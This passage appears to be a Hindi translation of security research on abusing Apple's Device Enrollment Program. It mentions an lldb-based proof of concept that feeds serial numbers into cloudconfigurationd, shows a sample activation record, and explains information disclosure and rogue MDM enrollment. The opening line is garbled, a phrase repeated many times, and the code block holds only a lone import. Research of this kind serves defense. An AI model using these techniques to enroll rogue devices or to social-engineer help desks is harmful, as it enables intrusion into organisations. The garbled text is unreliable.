निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए निर्धारित करने के लिए न
```
import lldb
```
इससे हमारे पास एक प्रमाण-सिद्धि बनाने के लिए स्क्रिप्ट करना आसान हो गया जिसमें हमने दिखाया कि कैसे एक डीईपी-पंजीकृत सीरियल नंबर को डालकर हमें एक मान्य डीईपी प्रोफ़ाइल प्राप्त होती है। हमने विकसित किया प्रमाण-सिद्धि एक सीरियल नंबर की सूची लेती है जिन्हें नए लाइनों से अलग किया जाता है और उन्हें `cloudconfigurationd` प्रक्रिया में डालती है ताकि डीईपी प्रोफ़ाइल की जांच की जा सके।

![Charles SSL Proxying सेटिंग्स।](https://duo.com/img/asset/aW1nL2xhYnMvcmVzZWFyY2gvaW1nL2NoYXJsZXNfc3NsX3Byb3h5aW5nX3NldHRpbmdzLnBuZw==?w=800\&fit=contain\&s=d1c9216716bf619e7e10e45c9968f83b)

![DEP सूचना।](https://duo.com/img/asset/aW1nL2xhYnMvcmVzZWFyY2gvaW1nL2RlcF9ub3RpZmljYXRpb24ucG5n?w=800\&fit=contain\&s=4f7b95efd02245f9953487dcaac6a961)

### प्रभाव

ऐपल के डिवाइस एनरोलमेंट प्रोग्राम का दुरुपयोग करने के कई परिदृश्य हैं जिनसे संगठन के बारे में संवेदनशील जानकारी प्रकट हो सकती है। दो सबसे स्पष्ट परिदृश्यों में शामिल हैं संगठन के बारे में जानकारी प्राप्त करना, जो डीईपी प्रोफ़ाइल से प्राप्त की जा सकती है। दूसरा यह है कि इस जानकारी का उपयोग करके एक रोग डीईपी और एमडीएम एनरोलमेंट करना। इनमें से प्रत्येक को नीचे और अधिक चर्चा की गई है।

#### जानकारी विस्तार

पहले ही उल्लिखित तरीके के अनुसार, डीईपी एनरोलमेंट प्रक्रिया का हिस्सा होता है डीईपी एपीआई से एक _सक्रियण रिकॉर्ड_ (या डीईपी प्रोफ़ाइल) का अनुरोध करना और प्राप्त करना। एक मान्य, डीईपी-पंजीकृत सिस्टम सीरियल नंबर प्रदान करके, हम निम्नलिखित जानकारी प्राप्त कर सकते हैं (या इसे `stdout` पर प्रिंट कर सकते हैं या `ManagedClient` लॉग में लिख सकते हैं, macOS संस्करण के आधार पर)।
```
Activation record: {
AllowPairing = 1;
AnchorCertificates =     (
<array_of_der_encoded_certificates>
);
AwaitDeviceConfigured = 0;
ConfigurationURL = "https://example.com/enroll";
IsMDMUnremovable = 1;
IsMandatory = 1;
IsSupervised = 1;
OrganizationAddress = "123 Main Street, Anywhere, , 12345 (USA)";
OrganizationAddressLine1 = "123 Main Street";
OrganizationAddressLine2 = NULL;
OrganizationCity = Anywhere;
OrganizationCountry = USA;
OrganizationDepartment = "IT";
OrganizationEmail = "dep@example.com";
OrganizationMagic = 105CD5B18CE24784A3A0344D6V63CD91;
OrganizationName = "Example, Inc.";
OrganizationPhone = "+15555555555";
OrganizationSupportPhone = "+15555555555";
OrganizationZipCode = "12345";
SkipSetup =     (
<array_of_setup_screens_to_skip>
);
SupervisorHostCertificates =     (
);
}
```
हालांकि, कुछ सूचनाएं कुछ संगठनों के लिए सार्वजनिक रूप से उपलब्ध हो सकती हैं, लेकिन संगठन के स्वामित्व में एक उपकरण के सीरियल नंबर के साथ डीईपी प्रोफ़ाइल से प्राप्त की गई जानकारी का उपयोग संगठन के हेल्प डेस्क या आईटी टीम के खिलाफ किसी भी सामाजिक इंजीनियरिंग हमले के लिए किया जा सकता है, जैसे कि पासवर्ड रीसेट का अनुरोध करना या कंपनी के एमडीएम सर्वर में उपकरण को नामांकित करने में मदद करना।

#### रोग डीईपी नामांकन

[एप्पल एमडीएम प्रोटोकॉल](https://developer.apple.com/enterprise/documentation/MDM-Protocol-Reference.pdf) उपयोगकर्ता प्रमाणीकरण का समर्थन करता है - लेकिन इसकी आवश्यकता नहीं है - एमडीएम नामांकन से पहले [एचटीटीपी बेसिक प्रमाणीकरण](https://en.wikipedia.org/wiki/Basic\_access\_authentication) के माध्यम से। **प्रमाणीकरण के बिना, एक वैध, डीईपी रजिस्टर्ड सीरियल नंबर की आवश्यकता होती है ताकि एक उपकरण को एमडीएम सर्वर में डीईपी के माध्यम से नामांकित किया जा सके**। इस प्रकार, एक हमलावर जो ऐसा सीरियल नंबर प्राप्त करता है, (या ओपन-सोर्स खुदाई, सामाजिक इंजीनियरिंग या ब्रूट-फोर्स के माध्यम से), संगठन के द्वारा स्वामित्विक नहीं होने के बावजूद अपने उपकरण को संगठन के रूप में नामांकित करने के लिए सक्षम होगा, जब तक कि यह वर्तमान में एमडीएम सर्वर में नामांकित नहीं है। मूल रूप से, यदि एक हमलावर वास्तविक उपकरण से पहले डीईपी नामांकन को प्रारंभ करके दौड़ जीतने में सक्षम होता है, तो वह उस उपकरण की पहचान ग्रहण कर सकता है।

संगठन एमडीएम का उपयोग करके उपकरण और उपयोगकर्ता प्रमाणपत्र, वीपीएन कॉन्फ़िगरेशन डेटा, नामांकन एजेंट, कॉन्फ़िगरेशन प्रोफ़ाइल और विभिन्न अन्य आंतरिक डेटा और संगठनात्मक रहस्यों जैसी संवेदनशील जानकारी तक डिप्लॉय कर सकते हैं। इसके अलावा, कुछ संगठन एमडीएम नामांकन का हिस्सा के रूप में उपयोगकर्ता प्रमाणीकरण की आवश्यकता नहीं करते हैं। इसके कई लाभ होते हैं, जैसे बेहतर उपयोगकर्ता अनुभव और कॉर्पोरेट नेटवर्क के बाहर होने वाले एमडीएम नामांकन को संभालने के लिए आंतरिक प्रमाणीकरण सर्वर को उजागर न करना।

यह समस्या डीईपी का उपयोग करके एमडीएम नामांकन को बूटस्ट्रैप करने पर उठती है, हालांकि, क्योंकि एक हमलावर को संगठन के एमडीएम सर्वर में अपनी पसंद के किसी भी अंतबिंदु को नामांकित करने की क्षमता होती है। इसके अलावा, एक हमलावर जब वह अपनी पसंद के अंतबिंदु को एमडीएम में सफलतापूर्वक नामांकित कर लेता है, तो उसे अधिकाधिक नेटवर्क के भीतर पिवट करने के लिए उपयोग किया जा सकता है।
